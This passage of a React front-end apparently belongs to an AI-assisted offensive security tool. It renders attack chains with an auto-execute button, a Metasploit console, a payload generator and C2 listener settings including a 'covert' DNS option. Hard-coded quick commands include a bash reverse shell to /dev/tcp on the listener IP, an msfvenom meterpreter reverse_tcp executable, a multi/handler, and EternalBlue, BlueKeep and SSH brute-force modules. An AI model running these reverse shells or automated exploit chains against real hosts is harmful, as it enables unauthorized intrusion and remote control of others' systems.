                                      S{step.id}: {step.name}
                                    </span>
                                    <div className="flex items-center gap-2">
                                      <span className="text-[10px] text-[#2F4F38] uppercase">{ss.status}</span>
                                      {chainExecution && ss.status === "pending" && chainExecution.status === "prepared" && (
                                        <button onClick={() => runSingleStep(step.id)} className="tac-btn text-[9px] py-0 px-2" data-testid={`run-step-${step.id}`}><Play size={9} /> RUN</button>
                                      )}
                                    </div>
                                  </div>
                                  <div className="mt-1 space-y-0.5">
                                    {(step.actions || []).map((a, ai) => (
                                      <div key={ai} className="flex items-center gap-1 text-[10px]">
                                        <span className="text-[#2F4F38] bg-[#020302] px-1 py-0.5 flex-1 truncate font-mono"><span className="text-[#FFB000]">[{a.tool}] </span>{a.cmd}</span>
                                        <button onClick={() => navigator.clipboard.writeText(a.cmd)} className="text-[#2F4F38] hover:text-[#00FF41]"><Copy size={9} /></button>
                                      </div>
                                    ))}
                                  </div>
                                  {/* Show results if step completed */}
                                  {ss.results && ss.results.length > 0 && (
                                    <div className="mt-2 space-y-1 border-t border-[rgba(0,255,65,0.1)] pt-1">
                                      {ss.results.map((r, ri) => (
                                        <div key={ri} className="text-[9px]">
                                          <span className={`font-bold ${r.result?.error ? "text-[#FF003C]" : "text-[#00FF41]"}`}>[{r.tool}]</span>
                                          {r.result?.error && <span className="text-[#FF003C] ml-1">{r.result.error}</span>}
                                          {r.result?.ports && <span className="text-[#8BBE95] ml-1">{r.result.ports.length} ports</span>}
                                          {r.result?.findings && <span className="text-[#FFB000] ml-1">{r.result.findings.length} vulns</span>}
                                          {r.result?.output && !r.result?.ports && !r.result?.findings && (
                                            <span className="text-[#8BBE95] ml-1 truncate block max-w-full">{r.result.output.substring(0, 200)}...</span>
                                          )}
                                          {r.result?.session_opened && <span className="text-[#FF003C] ml-1 font-bold">SESSION OPENED!</span>}
                                        </div>
                                      ))}
                                    </div>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        </ScrollArea>

                        {/* Execution logs */}
                        {chainExecution?.logs?.length > 0 && (
                          <div className="panel p-2">
                            <div className="text-[9px] text-[#2F4F38] uppercase mb-1">Execution Log</div>
                            <ScrollArea className="h-24">
                              {chainExecution.logs.map((l, i) => (
                                <div key={i} className="text-[9px] text-[#8BBE95] font-mono">{l.msg}</div>
                              ))}
                            </ScrollArea>
                          </div>
                        )}

                        <div className="flex gap-2">
                          {!chainExecution ? (
                            <>
                              <button onClick={prepareChain} className="tac-btn flex-1 justify-center text-[10px]" disabled={!target} data-testid="prepare-chain-btn">PREPARE (MANUAL)</button>
                              <button onClick={executeChainAuto} className="tac-btn tac-btn-red flex-1 justify-center text-[10px]" disabled={!target} data-testid="auto-execute-chain-btn"><Zap size={12} /> AUTO-EXECUTE</button>
                            </>
                          ) : chainExecution.status === "completed" ? (
                            <div className="w-full p-2 border border-[#00FF41]/50 bg-[rgba(0,255,65,0.05)] text-center text-xs text-[#00FF41]"><CheckCircle size={14} className="inline mr-2" />CHAIN COMPLETE - {chainExecution.progress}%</div>
                          ) : chainExecution.status === "running" ? (
                            <div className="w-full p-2 border border-[#FFB000]/50 bg-[rgba(255,176,0,0.05)] text-center text-xs text-[#FFB000] animate-pulse"><RefreshCw size={14} className="inline mr-2 animate-spin" />EXECUTING... Step {chainExecution.current_step}/{chainExecution.total_steps}</div>
                          ) : (
                            <div className="w-full text-center text-[10px] text-[#8BBE95]">Click RUN on each step or close and use AUTO-EXECUTE</div>
                          )}
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {suggestedChains.length > 0 && (
                          <div className="mb-3">
                            <h4 className="text-[10px] uppercase tracking-wider text-[#FFB000] mb-2">AI Recommended (Based on Scan Results)</h4>
                            {suggestedChains.map((c, i) => (
                              <div key={i} onClick={() => loadChainDetail(c.id)} className="panel p-3 mb-1 cursor-pointer hover:border-[#FFB000] border-[#FFB000]/30" data-testid={`suggested-chain-${c.id}`}>
                                <div className="flex items-center justify-between">
                                  <span className="text-xs text-[#FFB000] font-bold">{c.name}</span>
                                  <span className="text-[10px] text-[#00FF41]">Match: {c.match_score}</span>
                                </div>
                                <p className="text-[10px] text-[#8BBE95]">{c.description}</p>
                                <div className="flex gap-1 mt-1">{(c.matched_triggers || []).map((t, ti) => <span key={ti} className="text-[9px] px-1 border border-[#00FF41]/30 text-[#00FF41]">{t}</span>)}</div>
                              </div>
                            ))}
                          </div>
                        )}
                        <h4 className="text-[10px] uppercase tracking-wider text-[#2F4F38] mb-1">All Attack Chains</h4>
                        {attackChains.map(c => (
                          <div key={c.id} onClick={() => loadChainDetail(c.id)} className="panel p-3 cursor-pointer hover:border-[rgba(0,255,65,0.5)]" data-testid={`chain-card-${c.id}`}>
                            <div className="flex items-center justify-between">
                              <span className="text-xs text-[#FF003C] font-bold">{c.name}</span>
                              <span className="text-[10px] text-[#2F4F38]">{c.steps_count} steps</span>
                            </div>
                            <p className="text-[10px] text-[#8BBE95] mt-1">{c.description}</p>
                            <div className="flex gap-1 mt-1 flex-wrap">
                              {(c.triggers || []).map((t, ti) => <span key={ti} className="text-[10px] px-1 border border-[#FFB000]/30 text-[#FFB000]">{t}</span>)}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}

                {/* ===== MSF CLI ===== */}
                {activeSection === "msf" && (
                  <div className="space-y-3" data-testid="msf-section">
                    <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Metasploit CLI</h3>
                    <p className="text-[10px] text-[#8BBE95]">Direct msfconsole commands — no msfrpcd needed</p>
                    <div className="flex gap-1">
                      <input type="text" value={msfCmd} onChange={e => setMsfCmd(e.target.value)} onKeyDown={e => e.key === "Enter" && runMsfCommand()} placeholder="use exploit/...; set RHOSTS ...; run" className="tac-input flex-1 text-xs font-mono" data-testid="msf-cmd-input" />
                      <button onClick={runMsfCommand} disabled={msfExecuting} className="tac-btn tac-btn-solid text-[10px]" data-testid="msf-cmd-run">{msfExecuting ? <RefreshCw size={12} className="animate-spin" /> : <Play size={12} />} {msfExecuting ? "RUNNING..." : "EXECUTE"}</button>
                    </div>
                    {msfResult && (
                      <div className="panel" data-testid="msf-result">
                        <div className="panel-header"><span className={`text-[10px] ${msfResult.success ? "text-[#00FF41]" : "text-[#FFB000]"}`}>{msfResult.success ? "SESSION OPENED" : "COMPLETED"}</span></div>
                        <ScrollArea className="h-48 p-3"><pre className="text-[10px] text-[#8BBE95] font-mono whitespace-pre-wrap">{msfResult.output || msfResult.error || "No output"}</pre></ScrollArea>
                      </div>
                    )}
                    <div className="panel">
                      <div className="panel-header"><h3 className="text-[10px]">Quick Commands</h3></div>
                      <div className="p-3 grid grid-cols-2 gap-2">
                        {[
                          { label: "EternalBlue Scan", cmd: "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {target}; run" },
                          { label: "SSH Brute", cmd: "use auxiliary/scanner/ssh/ssh_login; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; run" },
                          { label: "HTTP Dir Scan", cmd: "use auxiliary/scanner/http/dir_scanner; set RHOSTS {target}; run" },
                          { label: "BlueKeep Check", cmd: "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS {target}; run" },
                        ].map((q, i) => (
                          <button key={i} onClick={() => setMsfCmd(q.cmd.replace("{target}", target || "TARGET"))} className="tac-btn text-[10px] text-left" data-testid={`msf-quick-${i}`}>{q.label}</button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* ===== PAYLOADS ===== */}
                {activeSection === "payloads" && (
                  <div className="space-y-3" data-testid="payloads-section">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Payload Generator</h3>
                      <div className="flex gap-2">
                        <span className={`text-[10px] px-2 py-1 border ${globalConfig.listener_ip ? "border-[#00FF41] text-[#00FF41]" : "border-[#FF003C] text-[#FF003C]"}`}>
                          LHOST: {globalConfig.listener_ip || "NOT SET"}:{globalConfig.listener_port}
                        </span>
                        <button onClick={loadPayloads} className="tac-btn text-[10px]" data-testid="refresh-payloads"><RefreshCw size={12} /></button>
                      </div>
                    </div>

                    {!globalConfig.listener_ip && (
                      <div className="panel p-3 border-[#FF003C]">
                        <div className="text-xs text-[#FF003C] flex items-center gap-2"><AlertTriangle size={14} /> LHOST no configurado. Ve a Config para establecer tu IP.</div>
                      </div>
                    )}

                    {/* AI Recommendations */}
                    {payloadRecommendations.length > 0 && (
                      <div className="panel p-3 border-[#FFB000]/30">
                        <div className="text-[10px] text-[#FFB000] font-bold uppercase mb-2">AI Recommended Payloads</div>
                        <div className="space-y-1">
                          {payloadRecommendations.map((r, i) => (
                            <div key={i} className="flex items-center justify-between p-1 border border-[#FFB000]/20">
                              <div>
                                <span className="text-[10px] text-[#FFB000]">{r.name}</span>
                                <span className="text-[9px] text-[#8BBE95] ml-2">{r.reason}</span>
                              </div>
                              <button onClick={() => generatePayload(r.payload_id)} disabled={!globalConfig.listener_ip} className="tac-btn text-[9px] py-0 px-2" data-testid={`ai-payload-${i}`}><Zap size={10} /> USE</button>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    <div className="flex gap-1">
                      {["all", "windows", "linux", "oneliner"].map(f => (
                        <button key={f} onClick={() => setPayloadFilter(f)} className={`text-[10px] px-2 py-1 border uppercase ${payloadFilter === f ? "border-[#00FF41] text-[#00FF41]" : "border-[rgba(0,255,65,0.15)] text-[#2F4F38]"}`} data-testid={`payload-filter-${f}`}>{f}</button>
                      ))}
                    </div>

                    {generatedPayload && (
                      <div className="panel p-4 border-[#00FF41]" data-testid="generated-payload-detail">
                        <div className="flex items-center justify-between mb-3">
                          <span className="text-xs text-[#00FF41] font-bold">{generatedPayload.name}</span>
                          <button onClick={() => setGeneratedPayload(null)} className="text-[#2F4F38] hover:text-[#FF003C]"><X size={14} /></button>
                        </div>
                        <div className="space-y-2">
                          <div>
                            <span className="text-[10px] text-[#FFB000] uppercase block mb-1">Generator Command</span>
                            <div className="flex items-center gap-1">
                              <code className="text-[10px] text-[#00FF41] bg-[#020302] px-2 py-2 flex-1 font-mono break-all">{generatedPayload.generator_cmd}</code>
                              <button onClick={() => navigator.clipboard.writeText(generatedPayload.generator_cmd)} className="text-[#2F4F38] hover:text-[#00FF41]"><Copy size={14} /></button>
                            </div>
                          </div>
                          <div>
                            <span className="text-[10px] text-[#FFB000] uppercase block mb-1">Handler</span>
                            <div className="flex items-center gap-1">
                              <code className="text-[10px] text-[#00F0FF] bg-[#020302] px-2 py-2 flex-1 font-mono break-all">{generatedPayload.handler_cmd}</code>
                              <button onClick={() => navigator.clipboard.writeText(generatedPayload.handler_cmd)} className="text-[#2F4F38] hover:text-[#00FF41]"><Copy size={14} /></button>
                            </div>
                          </div>
                          {generatedPayload.payload_content && (
                            <div>
                              <span className="text-[10px] text-[#FF003C] uppercase block mb-1">Payload (copy to target)</span>
                              <div className="flex items-center gap-1">
                                <code className="text-[10px] text-[#FF003C] bg-[#020302] px-2 py-2 flex-1 font-mono break-all">{generatedPayload.payload_content}</code>
                                <button onClick={() => navigator.clipboard.writeText(generatedPayload.payload_content)} className="text-[#2F4F38] hover:text-[#00FF41]"><Copy size={14} /></button>
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    <div className="space-y-1">
                      {payloadTemplates.filter(p => payloadFilter === "all" || p.platform === payloadFilter || p.type === payloadFilter).map((p, i) => (
                        <div key={i} className="panel p-3" data-testid={`payload-${p.id}`}>
                          <div className="flex items-center justify-between">
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2">
                                <span className="text-xs text-[#FF003C] font-bold">{p.name}</span>
                                <span className={`text-[10px] px-1 border ${p.type === "oneliner" ? "border-[#FFB000] text-[#FFB000]" : "border-[#00FF41] text-[#00FF41]"}`}>{p.type}</span>
                                <span className="text-[10px] px-1 border border-[#2F4F38] text-[#2F4F38]">{p.platform}/{p.arch}</span>
                              </div>
                              <p className="text-[10px] text-[#8BBE95] mt-1">{p.description}</p>
                            </div>
                            <button onClick={() => generatePayload(p.id)} disabled={!globalConfig.listener_ip} className="tac-btn tac-btn-red text-[10px] flex-shrink-0 ml-3" data-testid={`gen-payload-${p.id}`}><Zap size={12} /> GENERATE</button>
                          </div>
                        </div>
                      ))}
                      {payloadTemplates.length === 0 && <div className="text-[10px] text-[#2F4F38] text-center py-8">Loading payload templates...</div>}
                    </div>
                  </div>
                )}

                {/* ===== AI ENGINE ===== */}
                {activeSection === "ai" && (
                  <div className="space-y-3" data-testid="ai-section">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">AI Decision Engine</h3>
                      {currentScanId && (
                        <button onClick={() => window.open(`${API}/scan/${currentScanId}/report/pdf`, '_blank')} className="tac-btn tac-btn-red text-[10px]" data-testid="download-pdf-btn"><Download size={12} /> PDF</button>
                      )}
                    </div>

                    {aiAnalysis ? (
                      <div className="panel p-4">
                        <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
                          <h3 className="flex items-center gap-1"><Brain size={12} /> Kimi K2 Analysis</h3>
                        </div>
                        <div className="text-xs text-[#8BBE95] whitespace-pre-wrap leading-relaxed max-h-64 overflow-auto">{aiAnalysis}</div>
                      </div>
                    ) : (
                      <div className="panel p-8 text-center text-[10px] text-[#2F4F38]">Ejecuta un scan para obtener analisis AI</div>
                    )}

                    {/* AI Decision Log */}
                    {scanStatus?.ai_decisions?.length > 0 && (
                      <div className="panel">
                        <div className="panel-header"><h3>AI Decision Log</h3><span className="text-[10px] text-[#2F4F38]">{scanStatus.ai_decisions.length} decisions</span></div>
                        <ScrollArea className="h-40 p-3">
                          {scanStatus.ai_decisions.map((d, i) => (
                            <div key={i} className="flex items-start gap-2 py-1 border-b border-[rgba(0,255,65,0.08)]">
                              <span className="text-[10px] text-[#FFB000] flex-shrink-0">#{i+1}</span>
                              <div>
                                <span className={`text-[10px] font-bold ${d.action === "done" ? "text-[#00FF41]" : "text-[#00F0FF]"}`}>{d.action === "done" ? "DONE" : d.tool_id || d.action}</span>
                                <span className="text-[9px] text-[#8BBE95] ml-2">{d.reasoning}</span>
                              </div>
                            </div>
                          ))}
                        </ScrollArea>
                      </div>
                    )}

                    {suggestedChains.length > 0 && (
                      <div className="panel" data-testid="suggested-chains-section">
                        <div className="panel-header"><h3 className="text-[#FFB000]">Suggested Attack Chains</h3></div>
                        <div className="p-3 space-y-1">
                          {suggestedChains.map((c, i) => (
                            <div key={i} onClick={() => { loadChainDetail(c.id); setActiveSection("chains"); }} className="p-2 border border-[#FFB000]/30 cursor-pointer hover:border-[#FFB000]" data-testid={`ai-suggested-chain-${c.id}`}>
                              <span className="text-[10px] text-[#FFB000] font-bold">{c.name}</span>
                              <span className="text-[9px] text-[#8BBE95] ml-2">{c.description}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* ===== CONFIG ===== */}
                {activeSection === "config" && (
                  <div className="space-y-4" data-testid="config-section">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Global Operator Config</h3>
                      <button onClick={saveConfig} disabled={configSaving} className="tac-btn tac-btn-solid text-[10px]" data-testid="save-config-btn"><Save size={12} /> {configSaving ? "SAVING..." : "SAVE CONFIG"}</button>
                    </div>
                    <div className="panel p-4">
                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}>
                        <h3 className="flex items-center gap-1"><Globe size={12} className="text-[#FF003C]" /> Listener / VPS Config</h3>
                        <span className={`text-[10px] ${globalConfig.listener_ip ? "text-[#00FF41]" : "text-[#FF003C]"}`}>{globalConfig.listener_ip ? "CONFIGURED" : "NOT SET"}</span>
                      </div>
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Listener IP (VPS/LHOST)</label>
                          <input type="text" value={globalConfig.listener_ip} onChange={e => setGlobalConfig(prev => ({ ...prev, listener_ip: e.target.value }))} placeholder="e.g. 10.10.14.5" className="tac-input w-full text-xs" data-testid="config-listener-ip" />
                        </div>
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Listener Port (LPORT)</label>
                          <input type="number" value={globalConfig.listener_port} onChange={e => setGlobalConfig(prev => ({ ...prev, listener_port: parseInt(e.target.value) || 4444 }))} className="tac-input w-full text-xs" data-testid="config-listener-port" />
                        </div>
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">C2 Protocol</label>
                          <select value={globalConfig.c2_protocol} onChange={e => setGlobalConfig(prev => ({ ...prev, c2_protocol: e.target.value }))} className="tac-input w-full text-xs" data-testid="config-protocol">
                            <option value="tcp">TCP (Reverse Shell)</option>
                            <option value="https">HTTPS (Encrypted)</option>
                            <option value="dns">DNS (Covert)</option>
                          </select>
                        </div>
                        <div>
                          <label className="text-[10px] text-[#2F4F38] uppercase block mb-1">Operator Name</label>
                          <input type="text" value={globalConfig.operator_name} onChange={e => setGlobalConfig(prev => ({ ...prev, operator_name: e.target.value }))} className="tac-input w-full text-xs" data-testid="config-operator-name" />
                        </div>
                      </div>
                    </div>
                    <div className="panel p-4">
                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}><h3><Shield size={12} className="inline mr-1" />Operation Mode</h3></div>
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <div><div className="text-xs text-[#8BBE95]">Auto-Inject LHOST</div><div className="text-[10px] text-[#2F4F38]">Inyectar LHOST en todos los payloads</div></div>
                          <button onClick={() => setGlobalConfig(prev => ({ ...prev, auto_lhost: !prev.auto_lhost }))} className={`w-12 h-6 border transition-all ${globalConfig.auto_lhost ? "border-[#00FF41] bg-[rgba(0,255,65,0.15)]" : "border-[#2F4F38]"}`} data-testid="toggle-auto-lhost">
                            <div className={`w-4 h-4 mx-0.5 transition-all ${globalConfig.auto_lhost ? "ml-6 bg-[#00FF41]" : "bg-[#2F4F38]"}`} />
                          </button>
                        </div>
                        <div className="flex items-center justify-between">
                          <div><div className="text-xs text-[#8BBE95]">Stealth Mode</div><div className="text-[10px] text-[#2F4F38]">Evitar herramientas agresivas</div></div>
                          <button onClick={() => setGlobalConfig(prev => ({ ...prev, stealth_mode: !prev.stealth_mode }))} className={`w-12 h-6 border transition-all ${globalConfig.stealth_mode ? "border-[#FFB000] bg-[rgba(255,176,0,0.15)]" : "border-[#2F4F38]"}`} data-testid="toggle-stealth">
                            <div className={`w-4 h-4 mx-0.5 transition-all ${globalConfig.stealth_mode ? "ml-6 bg-[#FFB000]" : "bg-[#2F4F38]"}`} />
                          </button>
                        </div>
                      </div>
                    </div>
                    <div className="panel p-4">
                      <div className="panel-header" style={{ margin: "-16px -16px 12px", padding: "8px 12px" }}><h3>Quick Payload Commands</h3></div>
                      <div className="space-y-2">
                        {[
                          { label: "MSFvenom Reverse Shell", cmd: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${globalConfig.listener_ip || "YOUR_IP"} LPORT=${globalConfig.listener_port} -f exe > shell.exe` },
                          { label: "Bash Reverse Shell", cmd: `bash -i >& /dev/tcp/${globalConfig.listener_ip || "YOUR_IP"}/${globalConfig.listener_port} 0>&1` },
                          { label: "NC Listener", cmd: `nc -lvnp ${globalConfig.listener_port}` },
                          { label: "MSF Handler", cmd: `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${globalConfig.listener_ip || "YOUR_IP"}; set LPORT ${globalConfig.listener_port}; exploit"` },
                        ].map((item, i) => (
                          <div key={i} className="flex items-center gap-2">
                            <span className="text-[10px] text-[#FFB000] w-40 flex-shrink-0">{item.label}</span>
                            <code className="text-[10px] text-[#00FF41] bg-[#020302] px-2 py-1 flex-1 truncate font-mono">{item.cmd}</code>
                            <button onClick={() => navigator.clipboard.writeText(item.cmd)} className="text-[#2F4F38] hover:text-[#00FF41]" data-testid={`copy-cmd-${i}`}><Copy size={12} /></button>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* ===== LOGS ===== */}
                {activeSection === "logs" && (
                  <div className="space-y-3 h-full flex flex-col" data-testid="logs-section">
                    <div className="flex items-center gap-2">
                      {["all", "cmd", "success", "error", "warning", "info"].map(f => (
                        <button key={f} onClick={() => setLogFilter(f)} className={`text-[10px] px-2 py-1 border uppercase ${logFilter === f ? "border-[#00FF41] text-[#00FF41]" : "border-[rgba(0,255,65,0.15)] text-[#2F4F38]"}`} data-testid={`log-filter-${f}`}>{f}</button>
                      ))}
                    </div>
                    <div className="panel flex-1 p-3 overflow-auto font-mono" ref={terminalRef} style={{ background: "var(--bg-panel)" }}>
                      {filteredLogs.map((l, i) => (
                        <div key={i} className={`terminal-line ${l.type}`}>
                          <span className="text-[#2F4F38] mr-2">{l.time.toLocaleTimeString()}</span>
                          {l.text}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

              </motion.div>
            </AnimatePresence>
          </div>

          {/* RIGHT: Terminal Panel */}
          <div className="w-80 flex-shrink-0 border-l border-[rgba(0,255,65,0.15)] flex flex-col" style={{ background: "var(--bg-panel)" }}>
            <div className="panel-header">
              <h3 className="flex items-center gap-1"><Terminal size={12} /> LIVE OUTPUT</h3>
              <span className="text-[10px] text-[#2F4F38]">{terminalLines.length}</span>
            </div>
            <div className="flex-1 overflow-auto p-2 font-mono" ref={terminalRef}>
              {terminalLines.slice(-80).map((l, i) => (
                <div key={i} className={`terminal-line ${l.type}`}>{l.text}</div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
